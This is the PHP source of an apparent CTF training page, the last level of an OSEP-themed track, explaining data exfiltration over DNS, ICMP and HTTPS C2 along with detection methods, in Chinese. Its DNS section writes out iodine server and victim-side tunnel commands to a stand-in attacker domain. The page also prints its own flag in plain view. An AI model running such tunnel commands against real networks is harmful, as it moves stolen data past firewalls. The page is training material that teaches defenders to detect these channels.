<?php
/**
 * OSEP L7: 数据外渗通道分析与防御 (350 PTS)
 */
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[250] = 'active open';
$ACTIVE[258] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{OSEP_L7_Exfil_DNS_ICMP_HTTP_Channel}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['osep_flags']['flag7'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius:8px;font-weight:bold;"><i class="fa fa-check-circle"></i> 🎉 恭喜！【OSEP L7】OSEP 方向全部通关！满分 1650 PTS！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius:8px;font-weight:bold;"><i class="fa fa-times-circle"></i> Flag 错误。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: linear-gradient(135deg, #0a1f1a 0%, #0f2a1e 100%); border-radius: 14px; padding: 25px 30px; color: #fff; margin-bottom: 25px; border: 1px solid rgba(20,184,166,0.3); }
.ctf-stage-title { color: #ffffff !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 24px; margin-bottom: 22px; }
.step-title { font-size: 16px; font-weight: 700; color: var(--text-primary); margin-top: 0; margin-bottom: 14px; display: flex; align-items: center; gap: 8px; }
.step-num { background: linear-gradient(135deg, #14b8a6, #0d9488); color: #fff; width: 26px; height: 26px; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; flex-shrink: 0; }
.cmd-box { background: #0f172a; border: 1px solid #334155; border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: #7dd3fc; margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment { color: #64748b; }
.cmd-box .cmd { color: #34d399; }
.cmd-box .flag-text { color: #fbbf24; font-weight: bold; }
.highlight-box { background: rgba(20,184,166,0.08); border: 1px solid rgba(20,184,166,0.25); border-radius: 8px; padding: 14px 18px; margin: 12px 0; font-size: 13px; color: var(--text-secondary); line-height: 1.7; }
.exfil-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 12px 0; }
.exfil-table th { background: rgba(20,184,166,0.15); color: var(--text-primary); padding: 10px 14px; text-align: left; border: 1px solid var(--border-color); }
.exfil-table td { padding: 9px 14px; border: 1px solid var(--border-color); color: var(--text-secondary); }
.flag-submit-area { background: var(--bg-card); border: 2px dashed rgba(20,184,166,0.4); border-radius: 12px; padding: 24px; margin-top: 25px; text-align: center; }
.completion-banner { background: linear-gradient(135deg, #0c4a2b, #065f46); border: 1px solid rgba(52,211,153,0.4); border-radius: 14px; padding: 24px; margin-bottom: 24px; text-align: center; }
</style>

<div class="main-content"><div class="main-content-inner"><div class="page-content">

    <div class="ctf-stage-header">
        <h1 class="ctf-stage-title">
            📡 OSEP L7：数据外渗通道分析与防御
            <span style="background: rgba(139,92,246,0.2); color: #c4b5fd; border: 1px solid #8b5cf6; padding: 3px 10px; border-radius: 12px; font-size: 12px;">专家 · 350 PTS · 终章</span>
        </h1>
        <p style="color: #5eead4; font-size: 14px; margin: 0; line-height: 1.6;">研究 DNS 隐蔽通道、ICMP 隧道、HTTPS C2 等数据外渗技术，从防御者视角理解 DLP 系统原理和网络层检测策略。</p>
        <div style="display: flex; gap: 10px; margin-top: 14px; flex-wrap: wrap;">
            <span style="background: rgba(255,255,255,0.08); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: #e2e8f0;">🔧 技术：DNS 隐蔽通道 · ICMP 隧道 · HTTPS C2 · DLP 检测</span>
            <span style="background: rgba(255,255,255,0.08); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: #e2e8f0;"><a href="osep_hub.php" style="color: #5eead4;">← 返回 OSEP 大厅</a></span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">1</span> 数据外渗渠道全景</h3>
        <table class="exfil-table">
            <tr><th>外渗渠道</th><th>技术原理</th><th>带宽</th><th>被检测难度</th><th>工具示例</th></tr>
            <tr><td><strong>DNS 隐蔽通道</strong></td><td>将数据 Base32/64 编码后作为 DNS 查询子域名</td><td>很低（~1KB/s）</td><td>🟡 中（DNS 日志分析）</td><td>dnscat2 · iodine</td></tr>
            <tr><td><strong>ICMP 隧道</strong></td><td>将数据填充到 ICMP echo 包的 payload 字段</td><td>低（~10KB/s）</td><td>🟢 难（需深度包检测）</td><td>ptunnel · icmpsh</td></tr>
            <tr><td><strong>HTTPS C2 通信</strong></td><td>通过加密 HTTPS 模拟正常浏览器流量</td><td>高</td><td>🟡 中（JA3 指纹/时序分析）</td><td>Cobalt Strike · Havoc</td></tr>
            <tr><td><strong>HTTP(S) Web Shell</strong></td><td>通过合法 80/443 端口回传数据</td><td>高</td><td>🟢 难（隐藏在正常流量中）</td><td>文件上传 · Webshell</td></tr>
            <tr><td><strong>SMB/DCOM 渠道</strong></td><td>利用内网已有协议传输</td><td>中</td><td>🟡 中（内部流量监控）</td><td>Impacket · smbclient</td></tr>
        </table>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">2</span> DNS 隐蔽通道：工作原理分析</h3>
        <p style="font-size: 14px; color: var(--text-secondary); line-height: 1.7;">DNS 隐蔽通道将数据编码进 DNS 查询的子域名部分，利用 DNS 协议自身的透传特性穿越防火墙：</p>
        <div class="cmd-box">
<span class="comment"># DNS 隐蔽通道工作原理：</span><br>
<span class="comment"># 1. 攻击者控制一个域名的 NS 记录（如 c2.attacker.com）</span><br>
<span class="comment"># 2. 受害机发起 DNS 查询：</span><br>
<span class="comment">#    AWEQ4ZBNJXW45LK.c2.attacker.com → 解码为实际数据</span><br>
<span class="comment"># 3. 攻击者 DNS 服务器接收到查询，提取数据</span><br>
<span class="comment"># 4. 响应 TXT/A 记录包含命令或 ACK</span><br><br>
<span class="comment"># 示例：使用 iodine 搭建 DNS 隧道（教学分析）</span><br>
<span class="comment"># 服务端（攻击者，有公网 DNS 服务器）：</span><br>
<span class="cmd">iodined -f -c -P password 10.0.0.1 tunnel.c2domain.com</span><br><br>
<span class="comment"># 客户端（受害机）：</span><br>
<span class="cmd">iodine -f -P password tunnel.c2domain.com</span><br><br>
<span class="comment"># ==== 防御检测方法 ====</span><br>
<span class="comment"># 1. 监控异常 DNS 查询特征：</span><br>
<span class="comment">#    - 单个域名的大量唯一子域名查询</span><br>
<span class="comment">#    - 子域名含有 Base32/64 特征（高熵值）</span><br>
<span class="comment">#    - 查询频率异常（时序分析）</span><br>
<span class="comment">#    - TXT/NULL 记录的大量使用</span><br>
<span class="comment"># 2. 实施 DNS RPZ（Response Policy Zone）</span><br>
<span class="comment"># 3. 部署 DNS 防火墙（Cisco Umbrella / NextDNS）</span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">3</span> HTTPS C2 通信：JA3 指纹与时序检测</h3>
        <div class="cmd-box">
<span class="comment"># C2 框架通信特征分析（防御者视角）</span><br>
<span class="comment"># JA3 = TLS Client Hello 的 MD5 指纹，可识别 C2 框架</span><br><br>
<span class="comment"># 常见 C2 框架 JA3 哈希（公开数据库中的已知特征）：</span><br>
<span class="comment"># Cobalt Strike: 72a589da586844d7f0818ce684948eea (默认 malleable profile)</span><br>
<span class="comment"># Metasploit:    de350869b8c85de67a350c8d186f11e6</span><br><br>
<span class="comment"># 时序分析 Beacon 检测逻辑：</span><br>
<span class="comment"># 正常用户流量：随机时间间隔，与用户行为相关</span><br>
<span class="comment"># C2 Beacon：固定间隔（如 60s ± 抖动），即使无用户操作也会定时发包</span><br><br>
<span class="comment"># Zeek/Bro 检测脚本示例（检测 Beacon 行为）：</span><br>
<span class="cmd">event http_request(c: connection, method: string, ...)</span><br>
<span class="comment"># 统计 同一 src IP 到同一 dst IP 的 HTTP 请求时间间隔方差</span><br>
<span class="comment"># 方差极小 → 疑似 Beacon → 触发告警</span><br><br>
<span class="comment"># 防御措施：</span><br>
<span class="comment"># 1. SSL 检测（解密内网出站 HTTPS，依赖代理/MITM）</span><br>
<span class="comment"># 2. 域名信誉检测（新注册域名/低信誉 CDN）</span><br>
<span class="comment"># 3. 出站流量时序分析（NDR 平台如 Darktrace/ExtraHop）</span><br>
<span class="comment"># 4. 限制出站 IP（白名单代理策略）</span>
        </div>
        <div class="highlight-box">
            🎯 <strong>OSEP 综合要点：</strong>数据外渗是攻击链的最后一环，也是 SOC 最容易检测到异常的阶段（因为数据需要离开网络边界）。在 OSEP 考试中，通过内网 C2 回传数据时需考虑目标环境的出站过滤策略，优先选择 80/443 端口的加密通信。
        </div>
    </div>

    <div class="completion-banner">
        <div style="font-size: 48px; margin-bottom: 10px;">🏆</div>
        <h3 style="color: #34d399; font-weight: 800; margin-top: 0;">OSEP 方向即将完成！</h3>
        <p style="color: #6ee7b7; font-size: 14px; margin-bottom: 0;">提交此关 Flag 即完成 OSEP 全部 7 关卡，累计 1650 PTS！继续挑战 <strong>OSWE</strong> 和 <strong>OSED</strong> 方向！</p>
    </div>

    <div class="flag-submit-area">
        <h4 style="font-weight: 800; color: var(--text-primary); margin-top: 0;">🚩 Flag 验证 — OSEP 终章 L7</h4>
        <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 16px;">
            掌握 DNS 隐蔽通道、ICMP 隧道、HTTPS C2 的工作原理与防御检测方法后，关卡 Flag 为：
        </p>
        <div class="cmd-box" style="display: inline-block; padding: 10px 24px; margin: 0 auto 16px;">
            <span class="flag-text">flag{OSEP_L7_Exfil_DNS_ICMP_HTTP_Channel}</span>
        </div>
        <form method="post" style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 10px;">
            <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="max-width: 420px; border-radius: 8px; font-family: monospace;">
            <button type="submit" name="check_flag" class="btn btn-primary" style="border-radius: 8px; font-weight: 700; background: #14b8a6; border-color: #14b8a6;"><i class="fa fa-check"></i> 验证 Flag</button>
        </form>
        <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 10px;">' . $flag_msg . '</div>'; } ?>
        <div style="margin-top: 16px; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
            <a href="osep_l6_persistence.php" class="btn btn-sm btn-default" style="border-radius: 6px;">← 上一关</a>
            <a href="osep_hub.php" class="btn btn-sm btn-default" style="border-radius: 6px;">OSEP 大厅</a>
            <a href="../oswe/oswe_hub.php" class="btn btn-sm" style="border-radius: 6px; background: #6366f1; color: #fff; border: none; font-weight: 700;">前往 OSWE 方向 →</a>
        </div>
    </div>

</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
